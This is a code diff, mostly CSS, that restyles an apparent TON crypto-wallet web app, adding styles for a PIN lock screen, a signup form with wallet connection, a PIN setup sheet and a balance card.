@@ -8,15 +8,17 @@
 <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 <style>
   :root {
-    --bg: #f5f5f7;
+    --bg: #ffffff;
     --surface: #ffffff;
-    --surface-2: #f5f5f7;
-    --surface-3: #ebebef;
-    --line: #e5e5ea;
-    --text: #0a0a0b;
-    --text-2: #6e6e73;
-    --text-3: #9a9aa0;
+    --surface-2: #f2f3f5;
+    --surface-3: #e7e9ed;
+    --line: #ececef;
+    --line-2: #dcdde2;
+    --text: #0a0b0d;
+    --text-2: #5a5f68;
+    --text-3: #8e94a0;
     --blue: #0071e3;
+    --blue-2: #0091ff;
     --blue-ink: #0058b8;
     --blue-soft: #e8f1fd;
     --blue-ring: rgba(0, 113, 227, 0.18);
@@ -24,16 +26,18 @@
     --red-soft: #fdecec;
     --green: #30d158;
     --green-soft: #e6f8ec;
+    --orange: #f59e0b;
+    --orange-soft: #fff4e3;
     --radius-card: 22px;
     --radius-control: 16px;
     --radius-pill: 100px;
     --mono: 'SF Mono', 'JetBrains Mono', 'Menlo', 'Consolas', monospace;
-    --glass-bg: rgba(255, 255, 255, 0.72);
-    --glass-border: rgba(255, 255, 255, 0.85);
+    --glass-bg: rgba(255, 255, 255, 0.65);
+    --glass-border: rgba(255, 255, 255, 0.9);
     --glass-shadow:
-      0 12px 40px rgba(10, 11, 13, 0.1),
-      0 2px 8px rgba(10, 11, 13, 0.04),
-      inset 0 1px 0 rgba(255, 255, 255, 0.7);
+      0 16px 48px rgba(10, 11, 13, 0.12),
+      0 4px 12px rgba(10, 11, 13, 0.06),
+      inset 0 1px 0 rgba(255, 255, 255, 0.85);
   }
 
   [data-theme="dark"] {
@@ -42,10 +46,12 @@
     --surface-2: #1c1c1f;
     --surface-3: #26262a;
     --line: #1f1f22;
+    --line-2: #2c2c30;
     --text: #f5f5f7;
     --text-2: #a1a1a6;
     --text-3: #6e6e73;
     --blue: #0a84ff;
+    --blue-2: #3b8aff;
     --blue-ink: #409cff;
     --blue-soft: #0f1a2e;
     --blue-ring: rgba(10, 132, 255, 0.24);
@@ -53,12 +59,14 @@
     --red-soft: #2a1414;
     --green: #30d158;
     --green-soft: #0d2418;
-    --glass-bg: rgba(28, 28, 30, 0.72);
-    --glass-border: rgba(255, 255, 255, 0.08);
+    --orange: #ff9f0a;
+    --orange-soft: #2a1c0a;
+    --glass-bg: rgba(28, 28, 30, 0.65);
+    --glass-border: rgba(255, 255, 255, 0.09);
     --glass-shadow:
-      0 12px 40px rgba(0, 0, 0, 0.6),
-      0 2px 8px rgba(0, 0, 0, 0.3),
-      inset 0 1px 0 rgba(255, 255, 255, 0.06);
+      0 16px 48px rgba(0, 0, 0, 0.7),
+      0 4px 12px rgba(0, 0, 0, 0.4),
+      inset 0 1px 0 rgba(255, 255, 255, 0.07);
   }
 
   * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
@@ -82,162 +90,704 @@
     min-height: 100vh;
     display: flex;
     flex-direction: column;
-    padding-bottom: 120px;
+    padding-bottom: 130px;
     position: relative;
     z-index: 1;
   }
 
-  /* ============ TOP BAR ============ */
-  .topbar {
+  /* ============ LOCK SCREEN ============ */
+  .lock-screen {
+    position: fixed; inset: 0;
+    background: var(--bg);
+    z-index: 2000;
+    display: none;
+    flex-direction: column;
+    padding: 60px 32px 40px;
+    max-width: 420px;
+    margin: 0 auto;
+    text-align: center;
+    transition: opacity 0.35s ease;
+  }
+
+  .lock-screen.active { display: flex; }
+  .lock-screen.hidden { opacity: 0; pointer-events: none; }
+
+  .lock-logo {
+    width: 64px; height: 64px;
+    border-radius: 18px;
+    background: linear-gradient(180deg, var(--blue-2), var(--blue));
+    display: flex; align-items: center; justify-content: center;
+    box-shadow: 0 12px 32px var(--blue-ring);
+    margin: 0 auto 24px;
+  }
+
+  .lock-logo svg { width: 30px; height: 30px; }
+
+  .lock-title {
+    font-size: 24px;
+    font-weight: 800;
+    letter-spacing: -0.03em;
+    color: var(--text);
+    margin-bottom: 8px;
+  }
+
+  .lock-sub {
+    font-size: 14px;
+    color: var(--text-2);
+    margin-bottom: 40px;
+    letter-spacing: -0.005em;
+  }
+
+  .lock-dots {
     display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 16px 20px 8px;
+    justify-content: center;
+    gap: 14px;
+    margin-bottom: 40px;
+    height: 18px;
+  }
+
+  .lock-dot {
+    width: 14px; height: 14px;
+    border-radius: 50%;
+    background: var(--surface-3);
+    transition: background 0.2s;
+  }
+
+  .lock-dot.filled {
+    background: linear-gradient(180deg, var(--blue-2), var(--blue));
+    box-shadow: 0 0 0 3px var(--blue-ring);
+  }
+
+  .lock-keypad {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
     gap: 12px;
+    max-width: 320px;
+    margin: 0 auto 20px;
   }
 
-  .brand {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    min-width: 0;
-  }
-
-  .brand-mark {
-    width: 32px;
-    height: 32px;
-    border-radius: 10px;
-    background: var(--text);
+  .lock-key {
+    aspect-ratio: 1;
+    border-radius: 50%;
+    background: var(--surface-2);
+    border: 1px solid var(--line);
+    color: var(--text);
+    font-family: inherit;
+    font-size: 24px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.12s;
     display: flex;
     align-items: center;
     justify-content: center;
+  }
+
+  .lock-key:hover { background: var(--surface-3); }
+  .lock-key:active { transform: scale(0.92); }
+
+  .lock-key.empty { visibility: hidden; }
+
+  .lock-key.icon { background: transparent; border: none; }
+  .lock-key.icon svg { width: 24px; height: 24px; color: var(--text-2); }
+
+  .lock-actions {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    max-width: 320px;
+    margin: 20px auto 0;
+  }
+
+  .lock-biometric {
+    display: none;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    padding: 16px;
+    background: var(--surface-2);
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    font-family: inherit;
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--text);
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+
+  .lock-biometric.show { display: flex; }
+  .lock-biometric:hover { background: var(--surface-3); }
+  .lock-biometric:active { transform: scale(0.98); }
+  .lock-biometric svg { width: 22px; height: 22px; color: var(--blue); }
+
+  .lock-error {
+    color: var(--red);
+    font-size: 13px;
+    font-weight: 600;
+    min-height: 18px;
+    margin-top: 12px;
+    letter-spacing: -0.005em;
+  }
+
+  .lock-forgot {
+    background: transparent;
+    border: none;
+    color: var(--text-3);
+    font-family: inherit;
+    font-size: 13px;
+    font-weight: 500;
+    cursor: pointer;
+    margin-top: 24px;
+    text-decoration: underline;
+    text-underline-offset: 3px;
+  }
+
+  /* ============ SIGNUP SCREEN ============ */
+  .signup {
+    position: fixed; inset: 0;
+    background: var(--bg);
+    z-index: 1000;
+    display: flex;
+    flex-direction: column;
+    padding: 40px 24px 32px;
+    max-width: 420px;
+    margin: 0 auto;
+    transition: opacity 0.35s ease, transform 0.35s ease;
+    overflow-y: auto;
+  }
+
+  .signup.hidden {
+    opacity: 0;
+    pointer-events: none;
+    transform: translateY(-8px);
+  }
+
+  .signup-logo {
+    width: 68px; height: 68px;
+    border-radius: 20px;
+    background: linear-gradient(180deg, var(--blue-2), var(--blue));
+    display: flex; align-items: center; justify-content: center;
+    box-shadow: 0 12px 32px var(--blue-ring);
+    margin-bottom: 28px;
     flex-shrink: 0;
+  }
+
+  .signup-logo svg { width: 32px; height: 32px; }
+
+  .signup-title {
+    font-size: 32px;
+    font-weight: 800;
+    letter-spacing: -0.035em;
+    line-height: 1.15;
+    color: var(--text);
+    margin-bottom: 10px;
+  }
+
+  .signup-sub {
+    font-size: 15px;
+    color: var(--text-2);
+    line-height: 1.5;
+    margin-bottom: 32px;
+    letter-spacing: -0.005em;
+  }
+
+  .signup-form { display: flex; flex-direction: column; gap: 12px; margin-bottom: 16px; }
+
+  .signup-field {
+    background: var(--surface);
+    border: 1.5px solid var(--line);
+    border-radius: 16px;
+    padding: 16px 18px;
+    display: flex; align-items: center; gap: 12px;
+    transition: border-color 0.15s, background 0.15s;
+  }
+
+  .signup-field:focus-within {
+    border-color: var(--blue);
+    box-shadow: 0 0 0 4px var(--blue-ring);
+  }
+
+  .signup-field.valid { border-color: var(--green); }
+  .signup-field.invalid { border-color: var(--red); }
+
+  .signup-field-icon {
+    width: 22px; height: 22px;
+    color: var(--text-3);
+    flex-shrink: 0;
+    display: flex; align-items: center; justify-content: center;
+  }
+
+  .signup-field-icon svg { width: 20px; height: 20px; }
+
+  .signup-input {
+    flex: 1;
+    border: none;
+    background: transparent;
+    color: var(--text);
+    font-family: inherit;
+    font-size: 16px;
+    font-weight: 600;
+    outline: none;
+    letter-spacing: -0.01em;
+    min-width: 0;
+  }
+
+  .signup-input::placeholder {
+    color: var(--text-3);
+    font-weight: 500;
+  }
+
+  .signup-check-status {
+    width: 22px; height: 22px;
+    display: none;
+    align-items: center; justify-content: center;
+    color: var(--green);
+    flex-shrink: 0;
+  }
+
+  .signup-field.valid .signup-check-status { display: flex; }
+
+  .signup-check-status svg { width: 18px; height: 18px; }
+
+  .signup-hint {
+    font-size: 12px;
+    color: var(--text-3);
+    padding: 0 4px;
+    min-height: 16px;
+    letter-spacing: -0.005em;
+    transition: color 0.15s;
+  }
+
+  .signup-hint.error { color: var(--red); font-weight: 600; }
+  .signup-hint.ok { color: var(--green); font-weight: 600; }
+
+  .signup-wallet {
+    background: var(--surface);
+    border: 1.5px solid var(--line);
+    border-radius: 16px;
+    padding: 16px 18px;
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 12px;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+
+  .signup-wallet:hover { background: var(--surface-2); }
+  .signup-wallet:active { transform: scale(0.99); }
+
+  .signup-wallet.connected {
+    background: var(--blue-soft);
+    border-color: var(--blue);
+  }
+
+  .signup-wallet-left {
+    display: flex; align-items: center; gap: 12px;
+    min-width: 0;
+  }
+
+  .signup-wallet-icon {
+    width: 22px; height: 22px;
+    color: var(--text-3);
+    flex-shrink: 0;
+    display: flex; align-items: center; justify-content: center;
+  }
+
+  .signup-wallet.connected .signup-wallet-icon { color: var(--blue); }
+
+  .signup-wallet-icon svg { width: 20px; height: 20px; }
+
+  .signup-wallet-text {
+    display: flex; flex-direction: column;
+    min-width: 0;
+  }
+
+  .signup-wallet-label {
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--text);
+    letter-spacing: -0.01em;
+  }
+
+  .signup-wallet.connected .signup-wallet-label { color: var(--blue); }
+
+  .signup-wallet-addr {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--text-3);
+    margin-top: 1px;
+    letter-spacing: -0.01em;
+  }
+
+  .signup-wallet-badge {
+    font-size: 11px;
+    font-weight: 700;
+    color: var(--blue);
+    letter-spacing: 0.02em;
+    text-transform: uppercase;
+    padding: 4px 10px;
+    background: rgba(0, 113, 227, 0.12);
+    border-radius: 100px;
+    display: flex;
+    align-items: center;
+    gap: 4px;
+  }
+
+  .signup-wallet-badge svg { width: 12px; height: 12px; }
+
+  .signup-wallet-chevron {
+    width: 16px; height: 16px;
+    color: var(--text-3);
+    flex-shrink: 0;
+  }
+
+  .signup-wallet.connected .signup-wallet-chevron { display: none; }
+
+  .signup-terms {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    padding: 12px 4px;
+    cursor: pointer;
+    user-select: none;
+  }
+
+  .signup-terms-box {
+    width: 20px; height: 20px;
+    border-radius: 6px;
+    border: 1.5px solid var(--line-2);
+    background: var(--surface-2);
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+    transition: all 0.15s;
+    margin-top: 1px;
+  }
+
+  .signup-terms-box svg {
+    width: 12px; height: 12px;
+    color: #fff;
+    opacity: 0;
+    transition: opacity 0.15s;
+  }
+
+  .signup-terms.checked .signup-terms-box {
+    background: linear-gradient(180deg, var(--blue-2), var(--blue));
+    border-color: var(--blue);
+  }
+
+  .signup-terms.checked .signup-terms-box svg { opacity: 1; }
+
+  .signup-terms-text {
+    font-size: 12px;
+    color: var(--text-2);
+    line-height: 1.45;
+    font-weight: 500;
+    letter-spacing: -0.005em;
+  }
+
+  .signup-terms-text a {
+    color: var(--blue);
+    text-decoration: none;
+    border-bottom: 1px solid var(--blue-ring);
+  }
+
+  .signup-continue {
+    width: 100%;
+    padding: 18px;
+    background: var(--text);
+    color: var(--bg);
+    border: none;
+    border-radius: 16px;
+    font-family: inherit;
+    font-size: 16px;
+    font-weight: 700;
+    letter-spacing: -0.01em;
+    cursor: pointer;
+    transition: all 0.15s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    margin-top: 12px;
+  }
+
+  .signup-continue:hover:not(:disabled) { opacity: 0.92; }
+  .signup-continue:active:not(:disabled) { transform: scale(0.985); }
+
+  .signup-continue:disabled {
+    background: var(--surface-3);
+    color: var(--text-3);
+    cursor: not-allowed;
+  }
+
+  .signup-continue.accent {
+    background: linear-gradient(180deg, var(--blue-2), var(--blue));
+    color: #fff;
+    box-shadow: 0 8px 24px var(--blue-ring);
+  }
+
+  .signup-continue.accent:disabled {
+    background: var(--surface-3);
+    color: var(--text-3);
+    box-shadow: none;
+  }
+
+  /* ============ PIN SETUP MODAL ============ */
+  .pin-modal {
+    position: fixed; inset: 0;
+    background: rgba(10, 11, 13, 0.4);
+    -webkit-backdrop-filter: blur(20px);
+    backdrop-filter: blur(20px);
+    z-index: 1500;
+    display: none;
+    align-items: flex-end;
+    justify-content: center;
+    transition: opacity 0.3s;
+  }
+
+  .pin-modal.active { display: flex; }
+  .pin-modal.hidden { opacity: 0; pointer-events: none; }
+
+  .pin-sheet {
+    width: 100%;
+    max-width: 420px;
+    background: var(--surface);
+    border-radius: 28px 28px 0 0;
+    padding: 20px 20px 32px;
+    box-shadow: 0 -16px 48px rgba(10, 11, 13, 0.15);
+    animation: sheet-up 0.35s cubic-bezier(0.22, 1, 0.36, 1);
+  }
+
+  @keyframes sheet-up {
+    from { transform: translateY(100%); }
+    to { transform: translateY(0); }
+  }
+
+  .pin-grip {
+    width: 36px; height: 5px;
+    background: var(--line-2);
+    border-radius: 100px;
+    margin: 0 auto 20px;
+  }
+
+  .pin-title {
+    font-size: 22px;
+    font-weight: 800;
+    letter-spacing: -0.025em;
+    color: var(--text);
+    margin-bottom: 6px;
+  }
+
+  .pin-sub {
+    font-size: 13px;
+    color: var(--text-2);
+    line-height: 1.5;
+    margin-bottom: 20px;
+    letter-spacing: -0.005em;
+  }
+
+  .pin-inputs {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin-bottom: 20px;
+  }
+
+  .pin-inputs input {
+    width: 46px;
+    height: 54px;
+    border-radius: 12px;
+    border: 1.5px solid var(--line);
+    background: var(--surface-2);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 22px;
+    font-weight: 700;
+    text-align: center;
+    outline: none;
+    transition: all 0.15s;
+  }
+
+  .pin-inputs input:focus {
+    border-color: var(--blue);
+    background: var(--surface);
+    box-shadow: 0 0 0 4px var(--blue-ring);
+  }
+
+  .pin-actions {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+  }
+
+  .pin-skip {
+    width: 100%;
+    padding: 15px;
+    background: transparent;
+    border: none;
+    color: var(--text-3);
+    font-family: inherit;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    border-radius: 12px;
+    transition: background 0.15s;
+  }
+
+  .pin-skip:hover { background: var(--surface-2); }
+
+  /* ============ MAIN APP ============ */
+  .main-app { display: none; }
+  .main-app.show { display: block; }
+
+  .topbar {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 16px 20px 8px; gap: 12px;
+  }
+
+  .brand { display: flex; align-items: center; gap: 10px; min-width: 0; }
+
+  .brand-mark {
+    width: 32px; height: 32px; border-radius: 10px;
+    background: linear-gradient(180deg, var(--blue-2), var(--blue));
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+    box-shadow: 0 4px 14px var(--blue-ring);
   }
 
   .brand-mark svg { width: 16px; height: 16px; }
 
   .brand-name {
-    font-size: 16px;
-    font-weight: 700;
-    letter-spacing: -0.02em;
-    color: var(--text);
+    font-size: 16px; font-weight: 700;
+    letter-spacing: -0.02em; color: var(--text);
   }
 
   .glass-controls {
-    display: flex;
-    align-items: center;
-    gap: 6px;
+    display: flex; align-items: center; gap: 6px;
     padding: 4px;
     background: var(--glass-bg);
-    -webkit-backdrop-filter: blur(28px) saturate(180%);
-    backdrop-filter: blur(28px) saturate(180%);
+    -webkit-backdrop-filter: blur(30px) saturate(200%);
+    backdrop-filter: blur(30px) saturate(200%);
     border: 1px solid var(--glass-border);
     border-radius: 100px;
     box-shadow: var(--glass-shadow);
   }
 
   .glass-btn {
-    height: 32px;
-    min-width: 32px;
-    padding: 0 10px;
-    border: none;
-    background: transparent;
-    color: var(--text-2);
-    font-family: inherit;
-    font-size: 12px;
-    font-weight: 700;
-    letter-spacing: 0.02em;
-    border-radius: 100px;
+    height: 32px; min-width: 32px; padding: 0 10px;
+    border: none; background: transparent; color: var(--text-2);
+    font-family: inherit; font-size: 12px; font-weight: 700;
+    letter-spacing: 0.02em; border-radius: 100px;
     cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 4px;
+    display: flex; align-items: center; justify-content: center; gap: 4px;
     transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
   }
 
   .glass-btn svg { width: 15px; height: 15px; }
   .glass-btn:hover { background: rgba(0,0,0,0.05); color: var(--text); }
   .glass-btn:active { transform: scale(0.95); }
-
   [data-theme="dark"] .glass-btn:hover { background: rgba(255,255,255,0.06); }
 
-  .glass-divider {
-    width: 1px;
-    height: 18px;
-    background: var(--line);
-    opacity: 0.6;
-  }
+  .glass-divider { width: 1px; height: 18px; background: var(--line); opacity: 0.6; }
 
-  /* ============ BALANCE ============ */
-  .balance-hero {
-    padding: 20px 20px 28px;
-  }
+  .balance-hero { padding: 20px 20px 24px; }
 
   .balance-eyebrow {
-    font-size: 12px;
-    color: var(--text-3);
-    font-weight: 600;
-    letter-spacing: 0.02em;
-    text-transform: uppercase;
-    margin-bottom: 12px;
+    font-size: 12px; color: var(--text-3);
+    font-weight: 600; letter-spacing: 0.02em;
+    text-transform: uppercase; margin-bottom: 12px;
   }
 
   .balance-num-row {
-    display: flex;
-    align-items: baseline;
-    gap: 10px;
+    display: flex; align-items: baseline; gap: 10px;
     margin-bottom: 10px;
   }
 
   .balance-num {
-    font-size: 46px;
-    font-weight: 800;
-    letter-spacing: -0.045em;
-    color: var(--text);
-    font-variant-numeric: tabular-nums;
-    line-height: 1;
+    font-size: 46px; font-weight: 800;
+    letter-spacing: -0.045em; color: var(--text);
+    font-variant-numeric: tabular-nums; line-height: 1;
   }
 
   .balance-unit {
-    font-size: 18px;
-    font-weight: 700;
-    color: var(--text-2);
-    letter-spacing: -0.01em;
+    font-size: 18px; font-weight: 700;
+    color: var(--text-2); letter-spacing: -0.01em;
   }
 
   .balance-usd-row {
-    display: flex;
+    display: flex; align-items: center; gap: 10px;
+    font-size: 13px; color: var(--text-3);
+    font-variant-numeric: tabular-nums; font-weight: 500;
+    margin-bottom: 14px;
+  }
+
+  .ton-balance-card {
+    display: none;
     align-items: center;
     gap: 10px;
-    font-size: 13px;
-    color: var(--text-3);
-    font-variant-numeric: tabular-nums;
-    font-weight: 500;
-  }
-
-  .balance-pill {
-    display: inline-flex;
-    align-items: center;
-    gap: 5px;
-    padding: 3px 10px;
+    padding: 12px 14px;
     background: var(--surface-2);
-    color: var(--text-2);
-    border-radius: var(--radius-pill);
-    font-size: 11px;
-    font-weight: 700;
-    letter-spacing: 0.02em;
     border: 1px solid var(--line);
+    border-radius: 14px;
+    cursor: pointer;
+    transition: background 0.15s;
   }
 
-  .balance-pill .dot {
-    width: 5px;
-    height: 5px;
+  .ton-balance-card.show { display: flex; }
+  .ton-balance-card:hover { background: var(--surface-3); }
+  .ton-balance-card:active { transform: scale(0.99); }
+
+  .ton-balance-icon {
+    width: 28px; height: 28px;
     border-radius: 50%;
-    background: var(--blue);
+    background: linear-gradient(180deg, var(--blue-2), var(--blue));
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
   }
 
-  /* ============ SECTIONS ============ */
+  .ton-balance-icon svg { width: 14px; height: 14px; }
+
+  .ton-balance-text { flex: 1; min-width: 0; }
+
+  .ton-balance-label {
+    font-size: 11px;
+    color: var(--text-3);
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+    font-weight: 700;
+    margin-bottom: 2px;
+  }
+
+  .ton-balance-value {
+    font-size: 15px;
+    font-weight: 700;
+    color: var(--text);
+    font-variant-numeric: tabular-nums;
+    letter-spacing: -0.01em;
+  }
+
+  .ton-balance-value .unit {
+    color: var(--text-3);
+    font-weight: 600;
+    margin-left: 3px;
+    font-size: 13px;
+  }
+
+  .ton-balance-refresh {
+    width: 32px; height: 32px;
+    border: none; background: transparent;
+    color: var(--text-3);
+    border-radius: 9px;
+    cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+    transition: all 0.15s;
+  }
+
+  .ton-balance-refresh:hover { background: var(--surface); color: var(--text); }
+  .ton-balance-refresh.spinning svg { animation: spin 1s linear infinite; }
+
+  .ton-balance-refresh svg { width: 16px; height: 16px; }
+
   .section { display: none; padding: 0 20px; }
   .section.active { display: block; animation: fadeIn 0.28s ease; }
 
@@ -246,26 +796,61 @@
     to { opacity: 1; transform: translateY(0); }
   }
 
-  /* ============ CARD ============ */
+  .section-promo-center {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: calc(100vh - 340px);
+    padding: 0 20px;
+    text-align: center;
+  }
+
+  .section-promo-center.active { display: flex; animation: fadeIn 0.28s ease; }
+
+  .promo-center-inner { width: 100%; max-width: 340px; }
+
+  .promo-hero-icon {
+    width: 72px; height: 72px;
+    border-radius: 22px;
+    background: linear-gradient(180deg, var(--blue-2), var(--blue));
+    display: flex; align-items: center; justify-content: center;
+    box-shadow: 0 12px 32px var(--blue-ring);
+    margin: 0 auto 20px;
+  }
+
+  .promo-hero-icon svg { width: 34px; height: 34px; }
+
+  .promo-hero-title {
+    font-size: 24px;
+    font-weight: 800;
+    letter-spacing: -0.03em;
+    color: var(--text);
+    margin-bottom: 8px;
+    line-height: 1.2;
+  }
+
+  .promo-hero-sub {
+    font-size: 14px;
+    color: var(--text-2);
+    line-height: 1.5;
+    margin-bottom: 24px;
+    letter-spacing: -0.005em;
+  }
+
   .card {
     background: var(--surface);
     border: 1px solid var(--line);
     border-radius: var(--radius-card);
     margin-bottom: 12px;
     overflow: hidden;
-    box-shadow:
-      0 1px 2px rgba(10, 11, 13, 0.03),
-      0 1px 3px rgba(10, 11, 13, 0.02);
+    box-shadow: 0 1px 2px rgba(10, 11, 13, 0.03), 0 1px 3px rgba(10, 11, 13, 0.02);
   }
 
-  [data-theme="dark"] .card {
-    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.4);
-  }
+  [data-theme="dark"] .card { box-shadow: 0 1px 2px rgba(0, 0, 0, 0.4); }
 
   .card-row {
-    display: flex;
-    align-items: center;
-    gap: 12px;
+    display: flex; align-items: center; gap: 12px;
     padding: 15px 18px;
     border-bottom: 1px solid var(--line);
     min-height: 60px;
@@ -274,187 +859,137 @@
   .card-row:last-child { border-bottom: none; }
 
   .row-icon {
-    width: 38px;
-    height: 38px;
-    border-radius: 11px;
+    width: 38px; height: 38px; border-radius: 11px;
     background: var(--surface-2);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    flex-shrink: 0;
-    color: var(--text-2);
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0; color: var(--text-2);
     transition: all 0.15s;
   }
 
   .row-icon svg { width: 18px; height: 18px; }
-
-  .row-icon.blue {
-    background: var(--blue-soft);
-    color: var(--blue);
-  }
-
-  .row-icon.red {
-    background: var(--red-soft);
-    color: var(--red);
-  }
-
-  .row-icon.green {
-    background: var(--green-soft);
-    color: var(--green);
-  }
+  .row-icon.blue { background: var(--blue-soft); color: var(--blue); }
+  .row-icon.red { background: var(--red-soft); color: var(--red); }
+  .row-icon.green { background: var(--green-soft); color: var(--green); }
+  .row-icon.orange { background: var(--orange-soft); color: var(--orange); }
 
   .row-body { flex: 1; min-width: 0; }
 
   .row-label {
-    font-size: 12px;
-    color: var(--text-3);
-    font-weight: 500;
-    letter-spacing: 0.01em;
+    font-size: 12px; color: var(--text-3);
+    font-weight: 500; letter-spacing: 0.01em;
     margin-bottom: 2px;
   }
 
   .row-value {
-    font-size: 15px;
-    color: var(--text);
-    font-weight: 600;
-    letter-spacing: -0.01em;
+    font-size: 15px; color: var(--text);
+    font-weight: 600; letter-spacing: -0.01em;
     font-variant-numeric: tabular-nums;
   }
 
   .row-value.mono {
-    font-family: var(--mono);
-    font-size: 13px;
-    letter-spacing: -0.02em;
-    font-weight: 500;
+    font-family: var(--mono); font-size: 13px;
+    letter-spacing: -0.02em; font-weight: 500;
   }
 
   .row-value.muted { color: var(--text-2); font-weight: 500; }
 
   .row-chevron {
-    width: 16px;
-    height: 16px;
-    color: var(--text-3);
-    flex-shrink: 0;
+    width: 16px; height: 16px;
+    color: var(--text-3); flex-shrink: 0;
     transition: transform 0.25s;
   }
 
-  /* ============ FIELD ============ */
   .field {
-    display: flex;
-    align-items: center;
-    gap: 14px;
-    padding: 18px;
-    min-height: 68px;
+    display: flex; align-items: center; gap: 14px;
+    padding: 18px; min-height: 68px;
   }
 
   .field-input {
-    flex: 1;
-    border: none;
-    background: transparent;
-    color: var(--text);
-    font-family: inherit;
-    font-size: 17px;
-    font-weight: 600;
+    flex: 1; border: none; background: transparent;
+    color: var(--text); font-family: inherit;
+    font-size: 17px; font-weight: 600;
     letter-spacing: -0.01em;
-    outline: none;
-    min-width: 0;
-    padding: 0;
+    outline: none; min-width: 0; padding: 0;
   }
 
   .field-input::placeholder { color: var(--text-3); font-weight: 500; }
 
   .field-input.code {
     font-family: var(--mono);
-    font-size: 18px;
-    letter-spacing: 0.24em;
-    text-transform: uppercase;
-    font-weight: 700;
+    font-size: 20px; letter-spacing: 0.28em;
+    text-transform: uppercase; font-weight: 700;
+    text-align: center;
   }
 
   .field-suffix {
-    font-size: 13px;
-    color: var(--text-3);
-    font-weight: 700;
-    flex-shrink: 0;
+    font-size: 13px; color: var(--text-3);
+    font-weight: 700; flex-shrink: 0;
     font-variant-numeric: tabular-nums;
     letter-spacing: 0.02em;
   }
 
   .field-suffix.max {
-    color: var(--text-2);
-    cursor: pointer;
-    padding: 6px 12px;
-    border-radius: 100px;
-    background: var(--surface-2);
+    color: var(--blue); cursor: pointer;
+    padding: 6px 12px; border-radius: 100px;
+    background: var(--blue-soft);
     transition: all 0.15s;
-    border: 1px solid var(--line);
+    border: 1px solid var(--blue-ring);
     font-weight: 800;
   }
 
-  .field-suffix.max:hover { background: var(--surface-3); color: var(--text); }
+  .field-suffix.max:hover { background: var(--blue-ring); }
   .field-suffix.max:active { transform: scale(0.95); }
 
-  /* ============ BUTTONS ============ */
   .btn-primary {
-    width: 100%;
-    padding: 18px;
-    background: var(--text);
-    color: var(--bg);
-    border: none;
-    border-radius: var(--radius-control);
-    font-family: inherit;
-    font-size: 15px;
-    font-weight: 700;
-    letter-spacing: -0.01em;
-    cursor: pointer;
+    width: 100%; padding: 18px;
+    background: var(--text); color: var(--bg);
+    border: none; border-radius: var(--radius-control);
+    font-family: inherit; font-size: 15px; font-weight: 700;
+    letter-spacing: -0.01em; cursor: pointer;
     transition: all 0.15s;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    margin-top: 14px;
+    display: flex; align-items: center; justify-content: center;
+    gap: 8px; margin-top: 14px;
   }
 
-  .btn-primary:hover { opacity: 0.92; }
-  .btn-primary:active { transform: scale(0.985); }
+  .btn-primary:hover:not(:disabled) { opacity: 0.92; }
+  .btn-primary:active:not(:disabled) { transform: scale(0.985); }
 
   .btn-primary:disabled {
-    background: var(--surface-3);
-    color: var(--text-3);
-    cursor: not-allowed;
-    transform: none;
+    background: var(--surface-3); color: var(--text-3);
+    cursor: not-allowed; transform: none;
   }
 
   .btn-primary svg { width: 16px; height: 16px; }
 
   .btn-primary.accent {
-    background: var(--blue);
+    background: linear-gradient(180deg, var(--blue-2), var(--blue));
     color: #ffffff;
+    box-shadow: 0 6px 18px var(--blue-ring);
   }
 
-  .btn-primary.accent:hover {
-    background: var(--blue-ink);
-    opacity: 1;
+  .btn-primary.accent:hover:not(:disabled) { opacity: 0.94; }
+  .btn-primary.accent:disabled {
+    background: var(--surface-3); color: var(--text-3);
+    box-shadow: none;
   }
+
+  .btn-primary.danger {
+    background: var(--red);
+    color: #fff;
+    box-shadow: 0 6px 18px rgba(229, 72, 77, 0.25);
+  }
+
+  .btn-primary.danger:hover:not(:disabled) { opacity: 0.94; }
 
   .btn-secondary {
-    width: 100%;
-    padding: 15px;
-    background: var(--surface-2);
-    color: var(--text);
-    border: 1px solid var(--line);
-    border-radius: var(--radius-control);
-    font-family: inherit;
-    font-size: 14px;
-    font-weight: 600;
-    letter-spacing: -0.01em;
-    cursor: pointer;
+    width: 100%; padding: 15px;
+    background: var(--surface-2); color: var(--text);
+    border: 1px solid var(--line); border-radius: var(--radius-control);
+    font-family: inherit; font-size: 14px; font-weight: 600;
+    letter-spacing: -0.01em; cursor: pointer;
     transition: all 0.15s;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    margin-top: 10px;
+    display: flex; align-items: center; justify-content: center;
+    gap: 8px; margin-top: 10px;
   }
 
